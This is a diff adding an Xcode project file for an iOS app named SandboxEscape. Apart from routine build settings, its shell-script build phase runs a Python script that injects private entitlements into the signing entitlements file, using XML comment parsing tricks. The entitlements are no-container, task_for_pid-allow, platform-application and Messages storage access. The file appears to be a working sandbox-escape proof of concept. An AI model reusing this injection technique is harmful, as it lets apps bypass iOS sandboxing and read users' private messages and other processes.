@@ -1,0 +1,385 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 50;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		BB655A49245C0D39002B6769 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = BB655A48245C0D39002B6769 /* AppDelegate.m */; };
+		BB655A52245C0D39002B6769 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BB655A50245C0D39002B6769 /* Main.storyboard */; };
+		BB655A54245C0D3A002B6769 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = BB655A53245C0D3A002B6769 /* Assets.xcassets */; };
+		BB655A57245C0D3A002B6769 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BB655A55245C0D3A002B6769 /* LaunchScreen.storyboard */; };
+		BB655A5A245C0D3A002B6769 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = BB655A59245C0D3A002B6769 /* main.m */; };
+		BB655A67245C0E75002B6769 /* MainVC.m in Sources */ = {isa = PBXBuildFile; fileRef = BB655A66245C0E75002B6769 /* MainVC.m */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		BB655A44245C0D39002B6769 /* SandboxEscape.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SandboxEscape.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		BB655A47245C0D39002B6769 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
+		BB655A48245C0D39002B6769 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
+		BB655A51245C0D39002B6769 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		BB655A53245C0D3A002B6769 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		BB655A56245C0D3A002B6769 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		BB655A58245C0D3A002B6769 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		BB655A59245C0D3A002B6769 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		BB655A65245C0E75002B6769 /* MainVC.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MainVC.h; sourceTree = "<group>"; };
+		BB655A66245C0E75002B6769 /* MainVC.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MainVC.m; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		BB655A41245C0D39002B6769 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		BB655A3B245C0D39002B6769 = {
+			isa = PBXGroup;
+			children = (
+				BB655A46245C0D39002B6769 /* SandboxEscape */,
+				BB655A45245C0D39002B6769 /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		BB655A45245C0D39002B6769 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				BB655A44245C0D39002B6769 /* SandboxEscape.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		BB655A46245C0D39002B6769 /* SandboxEscape */ = {
+			isa = PBXGroup;
+			children = (
+				BB655A63245C0E67002B6769 /* Classes */,
+				BB655A50245C0D39002B6769 /* Main.storyboard */,
+				BB655A53245C0D3A002B6769 /* Assets.xcassets */,
+				BB655A55245C0D3A002B6769 /* LaunchScreen.storyboard */,
+				BB655A58245C0D3A002B6769 /* Info.plist */,
+				BB655A59245C0D3A002B6769 /* main.m */,
+			);
+			path = SandboxEscape;
+			sourceTree = "<group>";
+		};
+		BB655A61245C0E32002B6769 /* AppDelegate */ = {
+			isa = PBXGroup;
+			children = (
+				BB655A47245C0D39002B6769 /* AppDelegate.h */,
+				BB655A48245C0D39002B6769 /* AppDelegate.m */,
+			);
+			path = AppDelegate;
+			sourceTree = "<group>";
+		};
+		BB655A63245C0E67002B6769 /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				BB655A61245C0E32002B6769 /* AppDelegate */,
+				BB655A64245C0E6B002B6769 /* Controllers */,
+			);
+			path = Classes;
+			sourceTree = "<group>";
+		};
+		BB655A64245C0E6B002B6769 /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				BB655A65245C0E75002B6769 /* MainVC.h */,
+				BB655A66245C0E75002B6769 /* MainVC.m */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		BB655A43245C0D39002B6769 /* SandboxEscape */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = BB655A5D245C0D3A002B6769 /* Build configuration list for PBXNativeTarget "SandboxEscape" */;
+			buildPhases = (
+				BB655A40245C0D39002B6769 /* Sources */,
+				BB655A41245C0D39002B6769 /* Frameworks */,
+				BB655A42245C0D39002B6769 /* Resources */,
+				BB655A60245C0DC4002B6769 /* ShellScript */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = SandboxEscape;
+			productName = SandboxEscape;
+			productReference = BB655A44245C0D39002B6769 /* SandboxEscape.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		BB655A3C245C0D39002B6769 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 1140;
+				ORGANIZATIONNAME = superb;
+				TargetAttributes = {
+					BB655A43245C0D39002B6769 = {
+						CreatedOnToolsVersion = 11.4;
+					};
+				};
+			};
+			buildConfigurationList = BB655A3F245C0D39002B6769 /* Build configuration list for PBXProject "SandboxEscape" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = BB655A3B245C0D39002B6769;
+			productRefGroup = BB655A45245C0D39002B6769 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				BB655A43245C0D39002B6769 /* SandboxEscape */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		BB655A42245C0D39002B6769 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				BB655A57245C0D3A002B6769 /* LaunchScreen.storyboard in Resources */,
+				BB655A54245C0D3A002B6769 /* Assets.xcassets in Resources */,
+				BB655A52245C0D39002B6769 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		BB655A60245C0DC4002B6769 /* ShellScript */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /usr/bin/python;
+			shellScript = "import os\n# preinstalled python is python2\nfilename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'\n\nevil = '''\n    <!---><!-->\n    <key>platform-application</key>\n    <true/>\n    <key>com.apple.private.security.no-container</key>\n    <true/>\n    <key>task_for_pid-allow</key>\n    <true/>\n    <key>com.apple.private.security.storage.Messages</key>\n    <true/>\n    <!-- -->\n'''\nwith open(filename, 'r') as fp:\n  buf = fp.read()\ncursor = buf.rfind('</dict>')\noutput = buf[0:cursor] + evil + buf[cursor:]\nwith open(filename, 'w') as fp:\n  fp.write(output)\n";
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		BB655A40245C0D39002B6769 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				BB655A67245C0E75002B6769 /* MainVC.m in Sources */,
+				BB655A49245C0D39002B6769 /* AppDelegate.m in Sources */,
+				BB655A5A245C0D3A002B6769 /* main.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		BB655A50245C0D39002B6769 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				BB655A51245C0D39002B6769 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		BB655A55245C0D3A002B6769 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				BB655A56245C0D3A002B6769 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		BB655A5B245C0D3A002B6769 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.4;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+			};
+			name = Debug;
+		};
+		BB655A5C245C0D3A002B6769 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.4;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		BB655A5E245C0D3A002B6769 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 4N9DB5EG8S;
+				INFOPLIST_FILE = SandboxEscape/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.superb.SandboxEscape;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		BB655A5F245C0D3A002B6769 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 4N9DB5EG8S;
+				INFOPLIST_FILE = SandboxEscape/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.superb.SandboxEscape;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		BB655A3F245C0D39002B6769 /* Build configuration list for PBXProject "SandboxEscape" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				BB655A5B245C0D3A002B6769 /* Debug */,
+				BB655A5C245C0D3A002B6769 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		BB655A5D245C0D3A002B6769 /* Build configuration list for PBXNativeTarget "SandboxEscape" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				BB655A5E245C0D3A002B6769 /* Debug */,
+				BB655A5F245C0D3A002B6769 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = BB655A3C245C0D39002B6769 /* Project object */;
+}
